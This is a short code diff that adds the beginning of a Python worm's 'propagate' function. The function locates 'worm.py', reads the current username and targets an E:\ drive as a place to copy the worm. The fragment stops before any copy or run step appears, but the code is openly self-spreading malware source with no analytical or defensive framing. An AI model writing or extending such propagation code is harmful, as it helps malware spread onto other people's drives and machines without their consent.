@@ -9,3 +9,12 @@ import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
+
+
+def propagate():
+    source = os.path.abspath("worm.py")
+    user = getpass.getuser()
+
+    if (os.path.isdir("E:\\")):
+        destination = "E:"+ "\\worm.py"
+    
